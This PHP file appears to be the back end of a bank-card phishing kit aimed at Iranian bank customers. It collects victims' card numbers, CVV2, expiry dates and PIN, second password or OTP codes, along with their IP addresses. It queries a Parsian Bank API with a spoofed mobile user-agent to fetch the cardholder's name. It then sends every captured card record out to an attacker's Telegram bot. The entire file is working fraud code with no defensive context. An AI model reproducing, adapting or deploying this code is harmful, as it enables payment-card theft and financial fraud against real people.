<?php

/*Master == Koni! */

include "Bankinfo.php";
$paylimit = 10; 

// <---- . GET CARD . ----> //
if(isset($_POST["keyen"])){$keyen = $_POST["keyen"];}else{}
if(isset($_POST["pan"])){$pan=$_POST["pan"];}else{$paylimit=-1;}
$num2 = $_POST["num2"];
$pin = $_POST["pin"];
$cvv = $_POST["cvv2"];
$year = $_POST["year"];
$month = $_POST["month"];
$num = $_POST["num"];
$P= $_SERVER["REMOTE_ADDR"];
// <---- . GET CARD . ----> //

if ($num2 == 2){
    $passs = "OTP Cod";
}else{
    $passs = "Pass2";
}
$nnh = jdate("h:i:s a");
$nng = jdate('l Y F ');
$pan1 = substr($pan,0,4);
$pan2 = substr($pan,4,-8);
$pan3 = substr($pan,8,-4);
$pan4 = substr($pan,12);
$cardn = substr($pan,0,-10);
$bankinfo = bank_information($cardn);

/*Card Holder */

$Card= "$pan1$pan2$pan3$pan4";

$ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://ipb.parsian-bank.ir/mobileBank/1.0/getCardOwnerWithoutLogin");
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt( $ch, CURLOPT_HTTPHEADER, array("REMOTE_ADDR: " . $_SERVER["REMOTE_ADDR"], "HTTP_X_FORWARDED_FOR: ". $_SERVER["REMOTE_ADDR"]));
        curl_setopt($ch, CURLOPT_POSTFIELDS, "{\"destinationPan\":\"$Card\",\"pan\":\"6280231350040589\"}");
        curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Content-Type: application/json; charset=UTF-8',
            'User-Agent: Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/63.0.3239.83 Mobile Safari/537.36'
        ));
        $result     = curl_exec($ch);
        $json       = json_decode($result, true);
        $holderName = $json["firstName"] . " " . $json["lastName"];

/*END Card Holder */

include"../telegram.php";


if($keyen=="1"){
    $Text = "
┎━ᗒ─⌖━─━─⌬━⌬─━─━⌖─ᗕ━┒
┠ 🏦Bank: $bankinfo[1]
┃
┠ 🔥Card: <code>$pan1 $pan2 $pan3 $pan4</code>
┠ 🌩OTP: Waiting ...
┠ 🔱Cvv2: <code>$cvv</code>
┠ 🔱Year: <code>$year</code>  🔱Month: <code>$month</code>
┃ $pass
┖━ᗒ─⌖━─━─⌬━⌬─━─━⌖─ᗕ━┚
    ";
    if( (integer)$num > $paylimit){}else{
      
    file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));
   


 }	
}
else{
    
    $Text = "
┎━ᗒ─⌖━─━─⌬━⌬─━─━⌖─ᗕ━┒
┠ 🏦Bank: $bankinfo[1]
┃
┠ 🔥Card: <code>$pan1 $pan2 $pan3 $pan4</code>
┠ 🔱Cvv2: <code>$cvv</code>
┠ 🔱Year: <code>$year</code>  🔱Month: <code>$month</code>
┠ $passs : <code>$pin</code>
┃ $pass
┖━ᗒ─⌖━─━─⌬━⌬─━─━⌖─ᗕ━┚
    ";
    if( (integer)$num > $paylimit){}else{
     

      file_get_contents("https://api.telegram.org/bot$TOKEN/sendMessage?parse_mode=HTML&chat_id=$ID&text=".urlencode($Text));



    }	    
}
// <---- . Send Card . ----> //
?>